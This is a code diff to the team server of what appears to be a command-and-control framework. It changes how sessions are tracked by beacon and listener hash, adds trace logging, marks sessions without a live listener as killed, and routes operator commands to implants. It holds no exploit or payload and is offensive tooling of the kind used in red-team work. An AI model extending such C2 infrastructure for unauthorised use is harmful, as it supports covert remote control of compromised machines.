@@ -138,7 +138,6 @@ grpc::Status TeamServer::AddListener(grpc::ServerContext* context, const teamser
 
 	try 
 	{
-
 		if (type == ListenerTcpType)
 		{
 			std::unique_ptr<ListenerTcp> listenerTcp = make_unique<ListenerTcp>(localHost, localPort);
@@ -241,10 +240,14 @@ grpc::Status TeamServer::GetSessions(grpc::ServerContext* context, const teamser
 
 	for (int i = 0; i < m_listeners.size(); i++)
 	{
+		BOOST_LOG_TRIVIAL(trace) << "Listener " << m_listeners[i]->getListenerHash();
+
 		int nbSession = m_listeners[i]->getNumberOfSession();
 		for(int kk=0; kk<nbSession; kk++)
 		{
 			std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);
+
+			BOOST_LOG_TRIVIAL(trace) << "	Session " << session->getBeaconHash() << " From " << session->getListenerHash() << " " << session->getLastProofOfLife();
 
 			teamserverapi::Session sessionTmp;
 			sessionTmp.set_listenerhash(session->getListenerHash());
@@ -256,6 +259,33 @@ grpc::Status TeamServer::GetSessions(grpc::ServerContext* context, const teamser
 			sessionTmp.set_os(session->getOs());
 			sessionTmp.set_lastproofoflife(session->getLastProofOfLife());
 			sessionTmp.set_killed(session->isSessionKilled());
+
+			// check if the session still have a listener runing
+			bool haveAliveListener=false;
+			for (int i = 0; i < m_listeners.size(); i++)
+			{
+				if(m_listeners[i]->getListenerHash()==session->getListenerHash())
+				{
+					haveAliveListener=true;
+					break;
+				}
+
+				std::vector<SessionListener> sessionListener = m_listeners[i]->getSessionListenerInfos();
+				for (int j = 0; j < sessionListener.size(); j++)
+				{
+					if(sessionListener[j].getListenerHash()==session->getListenerHash())
+					{
+						haveAliveListener=true;
+						break;
+					}
+				}
+			}
+
+			if(!haveAliveListener)
+			{
+				sessionTmp.set_lastproofoflife("-1");
+				session->setSessionKilled();
+			}
 
 			if(!session->isSessionKilled())
 				writer->Write(sessionTmp);
@@ -271,12 +301,13 @@ grpc::Status TeamServer::StopSession(grpc::ServerContext* context, const teamser
 	BOOST_LOG_TRIVIAL(trace) << "StopSession";
 
 	std::string beaconHash=sessionToStop->beaconhash();
+	std::string listenerHash=sessionToStop->listenerhash();
 
 	if(beaconHash.size()==SizeBeaconHash)
 	{
 		for (int i = 0; i < m_listeners.size(); i++)
 		{
-			if (m_listeners[i]->isSessionExist(beaconHash))
+			if (m_listeners[i]->isSessionExist(beaconHash, listenerHash))
 			{
 				std::vector<std::string> endCmd;
 				endCmd.push_back(EndCmd);
@@ -312,10 +343,12 @@ grpc::Status TeamServer::SendCmdToSession(grpc::ServerContext* context, const te
 	BOOST_LOG_TRIVIAL(trace) << "SendCmdToSession";
 
 	std::string input = command->cmd();
-	std::string beaconHash = command->sessionid();
+	std::string beaconHash = command->beaconhash();
+	std::string listenerHash = command->listenerhash();
+	
 	for (int i = 0; i < m_listeners.size(); i++)
 	{
-		if (m_listeners[i]->isSessionExist(beaconHash))
+		if (m_listeners[i]->isSessionExist(beaconHash, listenerHash))
 		{
 			if (!input.empty())
 			{
@@ -380,9 +413,17 @@ grpc::Status TeamServer::GetResponseFromSession(grpc::ServerContext* context, co
 							(*it)->followUp(c2Message);
 						}
 					}
+
+					if(instruction==ListenerPolCmd)
+					{
+						BOOST_LOG_TRIVIAL(debug) << "beaconHash " << beaconHash;
+						BOOST_LOG_TRIVIAL(debug) << "returnvalue " << c2Message.returnvalue();
+						c2Message = m_listeners[i]->getTaskResult(beaconHash);
+						continue;
+					}
 					
 					teamserverapi::CommandResponse commandResponseTmp;
-					commandResponseTmp.set_sessionid(beaconHash);
+					commandResponseTmp.set_beaconhash(beaconHash);
 					commandResponseTmp.set_instruction(c2Message.instruction());
 					commandResponseTmp.set_cmd(c2Message.cmd());
 					commandResponseTmp.set_response(c2Message.returnvalue());
@@ -518,7 +559,7 @@ int main(int argc, char* argv[])
 {
 	logging::core::get()->set_filter
     (
-        logging::trivial::severity >= logging::trivial::debug
+        logging::trivial::severity >= logging::trivial::trace
     );
 	
 	std::string serverAddress("0.0.0.0:50051");
